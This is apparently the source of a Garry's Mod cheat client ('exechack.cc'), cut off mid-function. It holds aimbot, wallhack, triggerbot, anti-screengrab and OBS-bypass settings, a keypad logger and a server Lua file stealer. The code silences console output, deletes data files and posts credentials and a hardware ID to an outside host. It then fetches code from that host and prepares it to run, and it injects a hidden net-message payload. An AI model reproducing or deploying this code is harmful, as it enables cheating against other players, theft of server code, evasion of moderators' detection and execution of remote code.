local username, password, avatar = "exec", "clown", "https://exechack.cc/metaconstract/putin.jpg"
if a then return end
a = true
local b = {}
local c = {}
local d = table.insert
local e = math.random
local f = string.char
local g = pairs
local h = string.find
local i = util.TableToJSON
local j = file.Read
local k = timer.Simple
local l = surface.SetFont
local m = surface.SetDrawColor
local n = IsInGame
local o = draw.RoundedBox
local p = util.JSONToTable
local q = surface.DrawOutlinedRect
local r = surface.DrawRect
local s = draw.SimpleText
local t = Color
local u = vgui.Create
local v = string.format
local w = select
local x = IsValid
local y = draw.DrawText
local z = string.lower
local A = string.Replace
local B = surface.GetTextSize
local C = table.remove
local D = file.Write
local E = timer.Create
local F = string.Explode
local G = Lerp

for H = 65, 90 do
    d(c, f(H))
end

for H = 97, 122 do
    d(c, f(H))
end

local function I()
    local J = ""

    for K = 1, e(20) do
        J = J .. c[e(1, #c)]
    end

    return J
end

local L = MsgC
MsgC = function() end
local M = false
local N = false
local O = [[local a="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"timer.Simple(1,function()net.Start(a)net.WriteBool(false)net.WriteBool(true)net.WriteDouble(121.75)net.SendToServer()end)net.Receive(a,function()net.Start(a)net.WriteBool(false)net.WriteBool(false)net.SendToServer()end)hook.Add("ChatText","hide_joinleave",function(b,c,d,e)if e=="joinleave"then return true end;if e=="namechange"then return true end end)]]
b.maincfg = gmodgoodgame:Replace("}", ""):Replace("{", ""):Replace("-", ""):Replace("a", "") .. ".txt"
b.logs = I() .. ".txt"
b.runlua = I() .. ".txt"
b.allentity = I() .. ".txt"
b.aimbotfriend = I() .. ".txt"
b.aimteams = I() .. ".txt"
b.aimranks = I() .. ".txt"
b.exploits = I() .. ".txt"
b.allnet = I() .. ".txt"
b.cloudradarshit = I() .. ".txt"
b.antiscreengrab = I()
b.font22 = I()
b.font14 = I()
b.menufont = I()
b.fontsmall = I()
b.randomforhook = I()
b.obsbypassrand = I()
b.netloggerenabled = I()
b.netlogtxt = I() .. ".txt"
local P = {}

for K, Q in g(file.Find("*.png", "DATA")) do
    file.Delete(Q)
end

for K, Q in g(file.Find("*.txt", "DATA")) do
    if h(j(Q, "DATA") or "a", '"connect":') then
        file.Delete(Q)
    end

    if h(j(Q, "DATA") or "a", "WH_BOX_SIZE") then
        if not oldconfig then
            oldconfig = j(Q, "DATA")
            file.Delete(Q)
        else
            file.Delete(Q)
        end
    end
end

local function R(P)
    if P["WH_DISTANCE"] == nil then
        P["WH_DISTANCE"] = 1000
    end

    if P["WH_DORMANT"] == nil then
        P["WH_DORMANT"] = false
    end

    if P["WH_NAME"] == nil then
        P["WH_NAME"] = false
    end

    if P["WH_NAME_COLOR"] == nil then
        P["WH_NAME_COLOR"] = t(255, 255, 255)
    end

    if P["WH_NAME_POSITION"] == nil then
        P["WH_NAME_POSITION"] = 1
    end

    if P["WH_HEALTH"] == nil then
        P["WH_HEALTH"] = false
    end

    if P["WH_HEALTH_POSITION"] == nil then
        P["WH_HEALTH_POSITION"] = 4
    end

    if P["WH_HEALTH_TYPETYPE"] == nil then
        P["WH_HEALTH_TYPETYPE"] = "Bar"
    end

    if P["WH_ARMOR"] == nil then
        P["WH_ARMOR"] = false
    end

    if P["WH_ARMOR_POSITION"] == nil then
        P["WH_ARMOR_POSITION"] = 1
    end

    if P["WH_ARMOR_TYPETYPE"] == nil then
        P["WH_ARMOR_TYPETYPE"] = "Text"
    end

    if P["WH_MONEY"] == nil then
        P["WH_MONEY"] = false
    end

    if P["WH_MONEY_COLOR"] == nil then
        P["WH_MONEY_COLOR"] = t(0, 255, 0)
    end

    if P["WH_MONEY_POSITION"] == nil then
        P["WH_MONEY_POSITION"] = 1
    end

    if P["WH_WEAPON"] == nil then
        P["WH_WEAPON"] = false
    end

    if P["WH_WEAPON_COLOR"] == nil then
        P["WH_WEAPON_COLOR"] = t(255, 255, 0)
    end

    if P["WH_WEAPON_POSITION"] == nil then
        P["WH_WEAPON_POSITION"] = 1
    end

    if P["WH_WEAPON_TYPETYPE"] == nil then
        P["WH_WEAPON_TYPETYPE"] = "Only active"
    end

    if P["WH_JOB"] == nil then
        P["WH_JOB"] = false
    end

    if P["WH_JOB_POSITION"] == nil then
        P["WH_JOB_POSITION"] = 1
    end

    if P["WH_USERGROUP"] == nil then
        P["WH_USERGROUP"] = false
    end

    if P["WH_USERGROUP_POSITION"] == nil then
        P["WH_USERGROUP_POSITION"] = 1
    end

    if P["WH_USERGROUP_COLOR"] == nil then
        P["WH_USERGROUP_COLOR"] = t(0, 0, 255)
    end

    if P["WH_BOX"] == nil then
        P["WH_BOX"] = false
    end

    if P["WH_BOX_COLOR"] == nil then
        P["WH_BOX_COLOR"] = t(255, 255, 0)
    end

    if P["WH_BOX_TYPETYPE"] == nil then
        P["WH_BOX_TYPETYPE"] = "2d"
    end

    if P["WH_BOX_TEAMCOLOR"] == nil then
        P["WH_BOX_TEAMCOLOR"] = true
    end

    if P["WH_CHAMS"] == nil then
        P["WH_CHAMS"] = false
    end

    if P["WH_CHAMS_TYPE"] == nil then
        P["WH_CHAMS_TYPE"] = "Type 1"
    end

    if P["WH_CHAMS_TEAMCOLOR"] == nil then
        P["WH_CHAMS_TEAMCOLOR"] = true
    end

    if P["WH_CHAMS_COLOR"] == nil then
        P["WH_CHAMS_COLOR"] = t(255, 255, 255)
    end

    if P["WH_SKELETON"] == nil then
        P["WH_SKELETON"] = false
    end

    if P["WH_SKELETON_TEAMCOLOR"] == nil then
        P["WH_SKELETON_TEAMCOLOR"] = false
    end

    if P["WH_SKELETON_COLOR"] == nil then
        P["WH_SKELETON_COLOR"] = t(255, 255, 255)
    end

    if P["WH_ENTITY_DORMANT"] == nil then
        P["WH_ENTITY_DORMANT"] = false
    end

    if P["WH_ENTITY_DISTANCE"] == nil then
        P["WH_ENTITY_DISTANCE"] = 1000
    end

    if P["WH_ENTITY_NAME"] == nil then
        P["WH_ENTITY_NAME"] = false
    end

    if P["WH_ENTITY_NAME_COLOR"] == nil then
        P["WH_ENTITY_NAME_COLOR"] = t(255, 255, 255)
    end

    if P["WH_ENTITY_BOX"] == nil then
        P["WH_ENTITY_BOX"] = false
    end

    if P["WH_ENTITY_BOX_COLOR"] == nil then
        P["WH_ENTITY_BOX_COLOR"] = t(255, 255, 255)
    end

    if P["WH_ENTITY_BOX_TYPE"] == nil then
        P["WH_ENTITY_BOX_TYPE"] = "3d"
    end

    if P["WH_ENTITY_CHAMS"] == nil then
        P["WH_ENTITY_CHAMS"] = false
    end

    if P["WH_ENTITY_CHAMS_TYPE"] == nil then
        P["WH_ENTITY_CHAMS_TYPE"] = "XYZ"
    end

    if P["WH_ENTITY_CHAMS_COLOR"] == nil then
        P["WH_ENTITY_CHAMS_COLOR"] = t(255, 255, 255)
    end

    if P["NOSWAY"] == nil then
        P["NOSWAY"] = false
    end

    if P["WH_CURSORENTITYNAME"] == nil then
        P["WH_CURSORENTITYNAME"] = false
    end

    if P["WH_CURSORENTITYNAME_COLOR"] == nil then
        P["WH_CURSORENTITYNAME_COLOR"] = t(255, 255, 255)
    end

    if P["WH_NOSKY"] == nil then
        P["WH_NOSKY"] = false
    end

    if P["WH_NOSKY_COLOR"] == nil then
        P["WH_NOSKY_COLOR"] = t(255, 255, 255)
    end

    if P["WH_FULLBRIGHT"] == nil then
        P["WH_FULLBRIGHT"] = false
    end

    if P["WH_DEBUGCAMERA_ENABLED"] == nil then
        P["WH_DEBUGCAMERA_ENABLED"] = false
    end

    if P["WH_DEBUGCAMERA_KEY"] == nil then
        P["WH_DEBUGCAMERA_KEY"] = 0
    end

    if P["WH_DEBUGCAMERA_SPEEDS"] == nil then
        P["WH_DEBUGCAMERA_SPEEDS"] = 1
    end

    if P["WH_DEBUGCAMERA_RENDER"] == nil then
        P["WH_DEBUGCAMERA_RENDER"] = true
    end

    if P["WH_THIRDPERSON_ENABLED"] == nil then
        P["WH_THIRDPERSON_ENABLED"] = false
    end

    if P["WH_THIRDPERSON_KEY"] == nil then
        P["WH_THIRDPERSON_KEY"] = 0
    end

    if P["WH_THIRDPERSON_DISTANCE"] == nil then
        P["WH_THIRDPERSON_DISTANCE"] = 100
    end

    if P["WH_FOVVIEW_ENABLED"] == nil then
        P["WH_FOVVIEW_ENABLED"] = false
    end

    if P["WH_FOVVIEW"] == nil then
        P["WH_FOVVIEW"] = 100
    end

    if P["WH_FOVVIEW_MODEL"] == nil then
        P["WH_FOVVIEW_MODEL"] = 60
    end

    if P["AIM_DRAWFOV"] == nil then
        P["AIM_DRAWFOV"] = false
    end

    if P["WH_FOV_COLOR"] == nil then
        P["WH_FOV_COLOR"] = t(255, 255, 255)
    end

    if P["CROSSHAIR_ENABLED"] == nil then
        P["CROSSHAIR_ENABLED"] = false
    end

    if P["CROSSHAIR_CROSSHAIR"] == nil then
        P["CROSSHAIR_CROSSHAIR"] = false
    end

    if P["CROSSHAIR_FOV"] == nil then
        P["CROSSHAIR_FOV"] = false
    end

    if P["CROSSHAIR_BOX"] == nil then
        P["CROSSHAIR_BOX"] = false
    end

    if P["CROSSHAIR_SIZE"] == nil then
        P["CROSSHAIR_SIZE"] = 10
    end

    if P["CROSSHAIR_COLOR"] == nil then
        P["CROSSHAIR_COLOR"] = t(255, 255, 255)
    end

    if P["WH_INFO"] == nil then
        P["WH_INFO"] = false
    end

    if P["WH_INFO_X"] == nil or P["WH_INFO_X"] > ScrW() then
        P["WH_INFO_X"] = 10
    end

    if P["WH_INFO_Y"] == nil or P["WH_INFO_Y"] > ScrW() then
        P["WH_INFO_Y"] = 10
    end

    if P["WH_INFO_S_X"] == nil then
        P["WH_INFO_S_X"] = 200
    end

    if P["WH_INFO_S_Y"] == nil then
        P["WH_INFO_S_Y"] = 230
    end

    if P["WH_INFO_SHOW_HEALTH"] == nil then
        P["WH_INFO_SHOW_HEALTH"] = true
    end

    if P["WH_INFO_SHOW_ARMOR"] == nil then
        P["WH_INFO_SHOW_ARMOR"] = true
    end

    if P["WH_INFO_SHOW_VECOTIRY"] == nil then
        P["WH_INFO_SHOW_VECOTIRY"] = true
    end

    if P["WH_INFO_SHOW_SERVER"] == nil then
        P["WH_INFO_SHOW_SERVER"] = true
    end

    if P["WH_INFO_SHOW_ONLINE"] == nil then
        P["WH_INFO_SHOW_ONLINE"] = true
    end

    if P["WH_INFO_SHOW_MAP"] == nil then
        P["WH_INFO_SHOW_MAP"] = true
    end

    if P["WH_INFO_SHOW_ENTITTIES"] == nil then
        P["WH_INFO_SHOW_ENTITTIES"] = true
    end

    if P["WH_INFO_SHOW_FRAMES"] == nil then
        P["WH_INFO_SHOW_FRAMES"] = true
    end

    if P["WH_INFO_SHOW_PING"] == nil then
        P["WH_INFO_SHOW_PING"] = true
    end

    if P["WH_INFO_SHOW_DATE"] == nil then
        P["WH_INFO_SHOW_DATE"] = true
    end

    if P["WH_INFO_SHOW_TIME"] == nil then
        P["WH_INFO_SHOW_TIME"] = true
    end

    if P["WH_INFO_SHOW_TICKRATE"] == nil then
        P["WH_INFO_SHOW_TICKRATE"] = true
    end

    if P["WH_INFO_SHOW_GAMEMODE"] == nil then
        P["WH_INFO_SHOW_GAMEMODE"] = true
    end

    if P["WH_INFO_SHOW_TARGETAIM"] == nil then
        P["WH_INFO_SHOW_TARGETAIM"] = true
    end

    if P["WH_INFO_SHOW_CLIP"] == nil then
        P["WH_INFO_SHOW_CLIP"] = true
    end

    if P["WH_INFO_SHOW_KILLS"] == nil then
        P["WH_INFO_SHOW_KILLS"] = true
    end

    if P["WH_INFO_SHOW_DEADS"] == nil then
        P["WH_INFO_SHOW_DEADS"] = true
    end

    if P["WH_RADAR"] == nil then
        P["WH_RADAR"] = false
    end

    if P["WH_RADAR_X"] == nil or P["WH_RADAR_X"] > ScrW() then
        P["WH_RADAR_X"] = 10
    end

    if P["WH_RADAR_Y"] == nil or P["WH_RADAR_Y"] > ScrH() then
        P["WH_RADAR_Y"] = 10
    end

    if P["WH_RADAR_S_X"] == nil then
        P["WH_RADAR_S_X"] = 260
    end

    if P["WH_RADAR_S_Y"] == nil then
        P["WH_RADAR_S_Y"] = 260
    end

    if P["WH_RADAR_DISTANCE"] == nil then
        P["WH_RADAR_DISTANCE"] = 10
    end

    if P["WH_RADAR_SIZE"] == nil then
        P["WH_RADAR_SIZE"] = 3
    end

    if P["AIM_ENABLED"] == nil then
        P["AIM_ENABLED"] = false
    end

    if P["AIM_AUTOFIRE"] == nil then
        P["AIM_AUTOFIRE"] = false
    end

    if P["AIM_AUTORELOAD"] == nil then
        P["AIM_AUTORELOAD"] = false
    end

    if P["AIM_NORECOIL"] == nil then
        P["AIM_NORECOIL"] = false
    end

    if P["AIM_NOSPREAD"] == nil then
        P["AIM_NOSPREAD"] = false
    end

    if P["AIM_SILENT"] == nil then
        P["AIM_SILENT"] = false
    end

    if P["AIM_AUTOWALL"] == nil then
        P["AIM_AUTOWALL"] = false
    end

    if P["AIM_KEY"] == nil then
        P["AIM_KEY"] = 0
    end

    if P["AIM_FOV"] == nil then
        P["AIM_FOV"] = 0
    end

    if P["AIM_SMOOTHING"] == nil then
        P["AIM_SMOOTHING"] = 0
    end

    if P["AIM_HITBOX"] == nil then
        P["AIM_HITBOX"] = "Head"
    end

    if P["WH_SNAPLINE"] == nil then
        P["WH_SNAPLINE"] = false
    end

    if P["WH_SNAPLINE_COLOR"] == nil then
        P["WH_SNAPLINE_COLOR"] = t(255, 255, 255)
    end

    if P["LUALOADER_ANTISG"] == nil then
        P["LUALOADER_ANTISG"] = false
    end

    if P["MISC_SPECTATORLIST"] == nil then
        P["MISC_SPECTATORLIST"] = false
    end

    if P["MISC_SPECTATORLIST_X"] == nil or P["MISC_SPECTATORLIST_X"] > ScrW() then
        P["MISC_SPECTATORLIST_X"] = 10
    end

    if P["MISC_SPECTATORLIST_Y"] == nil or P["MISC_SPECTATORLIST_Y"] > ScrW() then
        P["MISC_SPECTATORLIST_Y"] = 10
    end

    if P["MISC_SPECTATORLIST_S_X"] == nil then
        P["MISC_SPECTATORLIST_S_X"] = 250
    end

    if P["MISC_SPECTATORLIST_S_Y"] == nil then
        P["MISC_SPECTATORLIST_S_Y"] = 90
    end

    if P["MISC_SPECTATORLIST_ONLYLOCALPLAYER"] == nil then
        P["MISC_SPECTATORLIST_ONLYLOCALPLAYER"] = false
    end

    if P["MISC_SPECTATORLIST_COLOR_ME"] == nil then
        P["MISC_SPECTATORLIST_COLOR_ME"] = t(255, 0, 0)
    end

    if P["MISC_SPECTATORLIST_COLOR_PLAYERS"] == nil then
        P["MISC_SPECTATORLIST_COLOR_PLAYERS"] = t(255, 255, 255)
    end

    if P["E_SPAMMER"] == nil then
        P["E_SPAMMER"] = false
    end

    if P["MISC_KEYPADLOGGER"] == nil then
        P["MISC_KEYPADLOGGER"] = false
    end

    if P["MISC_KEYPADLOGGER_COLOR"] == nil then
        P["MISC_KEYPADLOGGER_COLOR"] = t(255, 123, 0)
    end

    if P["MISC_BUNNYHOP"] == nil then
        P["MISC_BUNNYHOP"] = false
    end

    if P["MISC_AUTOSTRAFE"] == nil then
        P["MISC_AUTOSTRAFE"] = false
    end

    if P["MISC_SPECTATE_TARGET"] == nil then
        P["MISC_SPECTATE_TARGET"] = ""
    end

    if P["MISC_ANTIANTIAFK"] == nil then
        P["MISC_ANTIANTIAFK"] = false
    end

    if P["MISC_AUTOPISTOL"] == nil then
        P["MISC_AUTOPISTOL"] = 0
    end

    if P["LUA_FILE_STEALER"] == nil then
        P["LUA_FILE_STEALER"] = false
    end

    if P["PANICKEY"] == nil then
        P["PANICKEY"] = 0
    end

    if P["MENU_OPENKEY"] == nil then
        P["MENU_OPENKEY"] = 73
    end

    if P["MISC_ADDENTITYFRIEND"] == nil then
        P["MISC_ADDENTITYFRIEND"] = 0
    end

    if P["ENTITYLIST"] == nil then
        P["ENTITYLIST"] = {}
    end

    if P["ENTITYLISTclr"] == nil then
        P["ENTITYLISTclr"] = {}
    end

    if P["FRIENDLIST"] == nil then
        P["FRIENDLIST"] = {}
    end

    if P["RANKLIST"] == nil then
        P["RANKLIST"] = {}
    end

    if P["TEAMLIST"] == nil then
        P["TEAMLIST"] = {}
    end

    if P["ANTIAIM_ENABLED"] == nil then
        P["ANTIAIM_ENABLED"] = false
    end

    if P["ANTIAIM_X"] == nil then
        P["ANTIAIM_X"] = "Up"
    end

    if P["ANTIAIM_EMOTION_X"] == nil then
        P["ANTIAIM_EMOTION_X"] = 50
    end

    if P["ANTIAIM_Y"] == nil then
        P["ANTIAIM_Y"] = "Forward"
    end

    if P["ANTIAIM_EMOTION_Y"] == nil then
        P["ANTIAIM_EMOTION_Y"] = 20
    end

    if P["MENU_STYLE_TEXT"] == nil then
        P["MENU_STYLE_TEXT"] = t(255, 255, 255)
    end

    if P["MENU_STYLE_TEXT2"] == nil then
        P["MENU_STYLE_TEXT2"] = t(200, 200, 200)
    end

    if P["MENU_STYLE_TITLETEXT"] == nil then
        P["MENU_STYLE_TITLETEXT"] = t(255, 255, 255)
    end

    if P["MENU_STYLE_TITLEBAR"] == nil then
        P["MENU_STYLE_TITLEBAR"] = t(45, 45, 45)
    end

    if P["MENU_STYLE_WINDOWBG"] == nil then
        P["MENU_STYLE_WINDOWBG"] = t(35, 35, 35)
    end

    if P["MENU_STYLE_MENUBARBG"] == nil then
        P["MENU_STYLE_MENUBARBG"] = t(35, 35, 35)
    end

    if P["MENU_STYLE_BUTTON"] == nil then
        P["MENU_STYLE_BUTTON"] = t(35, 35, 35)
    end

    if P["MENU_STYLE_BUTTONHOVERED"] == nil then
        P["MENU_STYLE_BUTTONHOVERED"] = t(120, 120, 120, 100)
    end

    if P["MENU_STYLE_BORDER"] == nil then
        P["MENU_STYLE_BORDER"] = t(100, 100, 100)
    end

    if P["MENU_STYLE_SLIDER"] == nil then
        P["MENU_STYLE_SLIDER"] = t(255, 255, 255)
    end

    if P["MENU_STYLE_СHECKBOX"] == nil then
        P["MENU_STYLE_СHECKBOX"] = t(45, 45, 45)
    end

    if P["MENU_STYLE_СHECKBOXACTIVE"] == nil then
        P["MENU_STYLE_СHECKBOXACTIVE"] = t(100, 100, 255)
    end

    if P["MENU_STYLE_TEXTENTRY"] == nil then
        P["MENU_STYLE_TEXTENTRY"] = t(25, 25, 25)
    end

    if P["OBSBYPASS"] == nil then
        P["OBSBYPASS"] = false
    end

    if P["RESOLVER"] == nil then
        P["RESOLVER"] = false
    end

    if P["WH_FRIENDCOLOR"] == nil then
        P["WH_FRIENDCOLOR"] = t(0, 255, 0)
    end

    if P["SPAM_KILLSAY"] == nil then
        P["SPAM_KILLSAY"] = {"ex" .. "echa" .. "ck.cc"}
    end

    if P["SPAM_KILLSAY_ENABLED"] == nil then
        P["SPAM_KILLSAY_ENABLED"] = false
    end

    if P["SPAM_KILLSAY_OOC"] == nil then
        P["SPAM_KILLSAY_OOC"] = false
    end

    if P["WH_NAME_FRIENDCOLOR"] == nil then
        P["WH_NAME_FRIENDCOLOR"] = true
    end

    if P["CIRCLESTRAFE_KEY"] == nil then
        P["CIRCLESTRAFE_KEY"] = 0
    end

    if P["RESOLVER_X_AXIS"] == nil then
        P["RESOLVER_X_AXIS"] = "Off"
    end

    if P["RESOLVER_Y_AXIS"] == nil then
        P["RESOLVER_Y_AXIS"] = "Off"
    end

    if P["TRIGGERBOT_ENABLED"] == nil then
        P["TRIGGERBOT_ENABLED"] = false
    end

    if P["TRIGGERBOT_KEY"] == nil then
        P["TRIGGERBOT_KEY"] = 0
    end

    if P["TRIGGERBOT_HEAD"] == nil then
        P["TRIGGERBOT_HEAD"] = false
    end

    if P["TRIGGERBOT_CHEST"] == nil then
        P["TRIGGERBOT_CHEST"] = false
    end

    if P["TRIGGERBOT_STOMACH"] == nil then
        P["TRIGGERBOT_STOMACH"] = false
    end

    if P["TRIGGERBOT_LEFTARM"] == nil then
        P["TRIGGERBOT_LEFTARM"] = false
    end

    if P["TRIGGERBOT_RIGHTARM"] == nil then
        P["TRIGGERBOT_RIGHTARM"] = false
    end

    if P["TRIGGERBOT_LEFTLEG"] == nil then
        P["TRIGGERBOT_LEFTLEG"] = false
    end

    if P["TRIGGERBOT_RIGHTLEG"] == nil then
        P["TRIGGERBOT_RIGHTLEG"] = false
    end

    if P["HITSOUNDS"] == nil then
        P["HITSOUNDS"] = false
    end

    if P["HITSOUNDS_SOUND"] == nil then
        P["HITSOUNDS_SOUND"] = "buttons/bell1.wav"
    end

    if P["AIM_PRIORITY"] == nil then
        P["AIM_PRIORITY"] = "Field of View"
    end

    if P["AIM_ENTITYLIST"] == nil then
        P["AIM_ENTITYLIST"] = {}
    end

    if P["RDRSNA"] == nil then
        P["RDRSNA"] = true
    end

    if P["WH_PLAYER_FONT"] == nil then
        P["WH_PLAYER_FONT"] = "Roboto"
    end

    if P["WH_PLAYER_FONT_SIZE"] == nil then
        P["WH_PLAYER_FONT_SIZE"] = 16
    end

    if P["WH_ENTITY_FONT"] == nil then
        P["WH_ENTITY_FONT"] = "Roboto"
    end

    if P["WH_ENTITY_FONT_SIZE"] == nil then
        P["WH_ENTITY_FONT_SIZE"] = 16
    end

    if P["FILTER_ENABLED"] == nil then
        P["FILTER_ENABLED"] = false
    end

    if P["FILTER_BRIGHTNESS"] == nil then
        P["FILTER_BRIGHTNESS"] = 0
    end

    if P["FILTER_CONTRAST"] == nil then
        P["FILTER_CONTRAST"] = 1
    end

    if P["FILTER_SATURATION"] == nil then
        P["FILTER_SATURATION"] = 1
    end

    if P["WH_AIMTARGET_COLOR"] == nil then
        P["WH_AIMTARGET_COLOR"] = t(255, 0, 0)
    end

    if P["WH_PLAYER_FONT_OUTLINE"] == nil then
        P["WH_PLAYER_FONT_OUTLINE"] = false
    end

    if P["WH_ENTITY_FONT_OUTLINE"] == nil then
        P["WH_ENTITY_FONT_OUTLINE"] = false
    end

    if P["MISC_KEYPADLOGGER_AUTOENTER"] == nil then
        P["MISC_KEYPADLOGGER_AUTOENTER"] = true
    end

    if P["MISC_AUTOSTRAFE_TYPE"] == nil then
        P["MISC_AUTOSTRAFE_TYPE"] = "Legit"
    end

    if P["MISC_BUNNYHOP_SAVEHOPS"] == nil then
        P["MISC_BUNNYHOP_SAVEHOPS"] = 0
    end

    if P["AIM_FILTER_BABYGODTIME"] == nil then
        P["AIM_FILTER_BABYGODTIME"] = false
    end

    if P["AIM_FILTER_MYTEAM"] == nil then
        P["AIM_FILTER_MYTEAM"] = false
    end

    if P["AIM_FILTER_NOCLIP"] == nil then
        P["AIM_FILTER_NOCLIP"] = false
    end

    if P["CROSSHAIR_GERMANY"] == nil then
        P["CROSSHAIR_GERMANY"] = false
    end

    if P["WH_FOV_FILL"] == nil then
        P["WH_FOV_FILL"] = false
    end

    if P["MISC_SPAM_ENABLED"] == nil then
        P["MISC_SPAM_ENABLED"] = false
    end

    if P["MISC_SPAM_OOC"] == nil then
        P["MISC_SPAM_OOC"] = false
    end

    if P["MISC_SPAM_TEXT"] == nil then
        P["MISC_SPAM_TEXT"] = {"exec" .. "hack.cc"}
    end

    if P["STYLE_TEXT"] == nil then
        P["STYLE_TEXT"] = t(50, 50, 55)
    end

    if P["STYLE_WINDOWBG"] == nil then
        P["STYLE_WINDOWBG"] = t(235, 235, 240)
    end

    if P["STYLE_TEXT_NON_SELECTED"] == nil then
        P["STYLE_TEXT_NON_SELECTED"] = t(195, 195, 200)
    end

    if P["STYLE_BORDER"] == nil then
        P["STYLE_BORDER"] = t(202, 202, 207)
    end

    if P["STYLE_CHECKBOX"] == nil then
        P["STYLE_CHECKBOX"] = t(50, 50, 55)
    end

    if P["STYLE_BUTTON"] == nil then
        P["STYLE_BUTTON"] = t(235, 235, 235)
    end

    if P["STYLE_SLIDER"] == nil then
        P["STYLE_SLIDER"] = t(50, 50, 55)
    end

    if P["STYLE_"] == nil then
        P["STYLE_"] = "Light"
    end

    if P["WH_RADAR_TYPE"] == nil then
        P["WH_RADAR_TYPE"] = "Triangle"
    end

    if P["TEAMLISTESP"] == nil then
        P["TEAMLISTESP"] = {}
    end

    if P["ASPECTRATIO"] == nil then
        P["ASPECTRATIO"] = 1.7
    end

    if P["WH_ENTITY_NAME_SHOWOTHER"] == nil then
        P["WH_ENTITY_NAME_SHOWOTHER"] = false
    end

    k(1.5, function()
        b.ut()
    end)

    return P
end

if oldconfig then
    P = R(p(oldconfig))
else
    P = R({})
end

local S = {}

local function T(U, V)
    b.randomluaska = b.srn[e(1, #b.srn)]

    if V then
        S[1] = {
            name = b.randomluaska,
            code = A(U, "function()", "function()if " .. b.antiscreengrab .. " then return end ")
        }

        D(b.runlua, b.randomluaska)
    else
        S[1] = {
            name = b.randomluaska,
            code = U
        }

        D(b.runlua, b.randomluaska)
    end
end

D(b.maincfg, i(P))
local W = false
local X = {}

local function Y()
    X = p(j(b.maincfg, "DATA"))

    if n() and b.la == nil then
        k(10, function()
            W = true
            local Z = 0

            for _, a0 in g(exec_List("C:/exechack") or {}) do
                if not a0:find(".cfgexec") and a0:find("autorun") and a0 ~= "loginandpassword" then
                    k(Z, function()
                        T(exec_Read("C:/exechack" .. "/" .. a0), true)
                    end)

                    Z = Z + 3
                end
            end
        end)

        b.la = true
    end

    if not n() and b.la then
        b.la = nil
        W = false
    end

    if aspectratio then
        aspectratio(X["ASPECTRATIO"])
    end
end

Y()
E("check", 1, 0, Y)

function b.ut()
    b._color_text = X["STYLE_TEXT"]
    b._color_windowbg = X["STYLE_WINDOWBG"]
    b._color_non_selected = X["STYLE_TEXT_NON_SELECTED"]
    b._color_border = X["STYLE_BORDER"]
    b._color_checkbox = X["STYLE_CHECKBOX"]
    b._color_button = X["STYLE_BUTTON"]
    b._color_slider = X["STYLE_SLIDER"]
end

b.ut()

local function a1(a2, a3)
    local a4 = p(j(b.maincfg, "DATA"))
    a4[a2] = a3
    D(b.maincfg, i(a4))
    X[a2] = a3
    b.ut()
end

if n() then
    RunConsoleCommand("retry")
end

local function a5(a6)
    local a = {}

    for a7 in a6:gsub('[^\128-\191][\128-\191]*', function(a8) return a8:find'%w' and '\0' .. a8 .. '\0' end):gsub('%z%z', ''):gmatch'%z(.-)%z' do
        d(a, a7)
    end

    return unpack(a) or "noname"
end

local a9 = {}
local aa = {}
b.srn = {}
local ab = GameDetails

function GameDetails(ac, ad, ae, af, ag, ah)
    a1("MISC_SPECTATE_TARGET", "")
    D(b.logs, '{"connect":"","damage":"","namechange":"","disconnect":"","chat":"","kill":""}')
    a9 = {}
    aa = {}
    GetHostName2 = ac
    GetHostName = a5(ac)
    ScriptExistsif = exec_Exists("C:/exechack" .. "/" .. GetHostName)
    b.run = true
    b.srn = {}
    N = false

    return ab(ac, ad, ae, af, ag, ah)
end

local function ai(aj)
    local a8 = 0
    local ak = F("/", aj)
    local al = ""

    for _, am in g(ak) do
        if _ == #ak then
        else
            if al .. am == "entities" then
                a8 = _
            end
        end
    end

    if a8 == 0 then return false end
    local an = ak[a8 + 1]
    if a9[an] then return end
    a9[an] = true

    return an:Replace(".lua", "")
end

local ao

if username then
    http.Post("ht" .. "tps://e" .. "xechac" .. "k.cc/fo" .. "ru" .. "m/au" .. "ths.php", {
        username = username,
        password = password,
        hwid = gmodgoodgame,
        gay = "y" .. "es"
    }, function(a)
        ao = v(A(a, "IK01x" .. "m9QxL", "%s"), b.font22, b.menufont, b.font14, b.maincfg, b.logs, b.randomforhook, b.runlua, b.fontsmall, b.antiscreengrab, b.antiscreengrab):Replace("|", " % "):Replace("gaySEX()", " continue; "):Replace("gayFixMovement()", "local function FixMovement(b,c)local d=Vector(b:GetForwardMove(),b:GetSideMove(),0)local e=math.sqrt(d.x*d.x+d.y*d.y)local f=d:Angle()local g=b:GetViewAngles().y-c.y+f.y;if(b:GetViewAngles().p+90)%360>180 then g=180-g end;g=(g+180)%360-180;b:SetForwardMove(math.cos(math.rad(g))*e)b:SetSideMove(math.sin(math.rad(g))*e)end ")
    end)
else
    ao = v(A([[]], "IK01xm9QxL", "%s"), b.font22, b.menufont, b.font14, b.maincfg, b.logs, b.randomforhook, b.runlua, b.fontsmall, b.antiscreengrab, b.antiscreengrab):Replace("|", " % "):Replace("gaySEX()", " continue; "):Replace("gayFixMovement()", "local function FixMovement(b,c)local d=Vector(b:GetForwardMove(),b:GetSideMove(),0)local e=math.sqrt(d.x*d.x+d.y*d.y)local f=d:Angle()local g=b:GetViewAngles().y-c.y+f.y;if(b:GetViewAngles().p+90)%360>180 then g=180-g end;g=(g+180)%360-180;b:SetForwardMove(math.cos(math.rad(g))*e)b:SetSideMove(math.sin(math.rad(g))*e)end ")
end

if not username then
    username = 'Loser'
    password = ''
    avatar = 'https://exechack.cc/forum/data/avatars/s/0/1.jpg'
end

hook.Add("bi" .. "tch", "1", function(a, aj)
    local ap = X["WH_PL" .. "AYER_FONT_" .. "OUTLINE"] and "true" or "false"
    local aq = X["WH_EN" .. "TITY_FONT_O" .. "UTLINE"] and "true" or "false"
    local ac = ai(a)

    if ac then
        aa[ac] = true
    end

    if a and a:find("lua") and not n() then
        b.srn[#b.srn + 1] = a
    end

    if GetHostName2:find("HappyRP") or GetHostName2:find("HappyWars") then
        if #b.srn == 100 and b.run then
            b.run = false

